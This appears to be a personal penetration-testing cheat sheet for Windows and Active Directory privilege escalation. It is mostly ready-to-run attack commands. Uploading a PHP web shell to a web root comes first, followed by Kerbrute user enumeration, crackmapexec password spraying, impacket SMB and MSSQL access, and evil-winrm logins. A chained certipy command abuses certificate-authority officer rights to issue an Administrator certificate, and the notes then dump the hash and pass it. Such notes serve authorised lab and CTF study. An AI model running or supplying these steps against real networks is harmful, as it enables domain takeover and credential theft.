# Windows Privilege Escalation

Windows:

- when in a Windows box check rpcclient with command

```jsx
rpcclient -U "user" domain
```

- If we can see Admin info is being shared with the guest account we can attempt to go to
    - c:\xampp\htdocs
        - this directory is where html files can be placed and accessed via http or https
        - example: https//website/p0wnyshell.php
- If smb port is open, 445, we can try first to login anonymously to SMB to gain access. If this is unsuccessful we can use a tool called Kerbrute to try and find a user for us to get ahold of
- Kerbrute:
    
    ```jsx
    ./kerbrute_linux_amd64 userenum -d 'domain' /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 'domain controller name'
    ```
    
    - Kerbrute uses the wordlist provided to attempt to find common usernames that would be used in an everyday environment
- We can run a tool called crackmapexec against the protocol smb to attempt to use a username txt file to find if any user is using their password the same thing as their username.
    
    ```jsx
    crackmapexec smb ip -u users.txt -p users.txt --no-brute --continue-on-success
    ```
    
- We can use a tool called impacket-smbclient to attempt to connect to a server via smb, we must have a known username and password
    
    ```jsx
    impacket-smbclient domain/usernam:password@ipaddress -target-ip ipaddress
    ```
    
    - once connected run ‘ls’ to see what shares you can see
- If we have known good credentials on a windows machine AND we see the port open for mssql we can attempt to access that port using impacket-mssqlclient
    
    ```jsx
    impacket-mssqlclient -port PORT domain/username:password@ipaddress -window
    ```
    
    - A trick once in with mssql is to use the below command to see all available files on the server
    
    ```jsx
    EXEC xp_dirtree 'c:\inetpub\wwwroot', 1, 1;
    ```
    
- If we are to find a users username and password we can use the tool evil-winrm to login to the device

```jsx
evil-winrm -i IPADDRESS -u USERNAME
```

- A tool we can use to find vulnerable CA’s or what CA they are using is certify.exe
    - upload the certify.exe to the victim device
    
    ```jsx
    ./Certify.exe find /vulnerable
    ```
    
- If we can get ahold of an account that can manage CA we can use that account to actually issue a new cert to for instance the Administrator account
    - This is done with the certipy tool
- Certipy

```jsx
certipy ca -ca 'Enterprise CA Name' -add-officer USERNAME -username USERNAME@domain -password '<password>' && certipy ca -ca 'Enterprise CA Name' -enable-template SubCA -username USERNAME@domain -password '<password>' && certipy req -username USERNAME@domain -password '<password>' -ca 'Enterprise CA Name' -target domain -template SubCA -upn administrator@domain && certipy ca -ca "Enterprise CA Name" -issue-request <private_key_id> -username 'USERNAME@domain' -password '<password>' && certipy req -username 'USERNMAE@domain' -password '<password>' -ca "Enterprise CA Name" -target domain -retrieve <private_key_id>
```

- The command ABOVE does a lot of different things but it basically assigns the SubCA as the compromised regular user account and assigns a new private key file to administrator@domain with a new private ID.
    - During the execution of the command it will prompt if you want to down the private key file, press Y
- Once Certipy has been run and you find success you can now use the command below to dump the hash to yourself using the new private key file made available to you

```jsx
certipy auth -pfx filename.pfx -dc-ip ipaddress
```

- You can also use evil-winrm using a hash

```jsx
evil-winrm -i ipaddress -u USERNAME -H HASH
```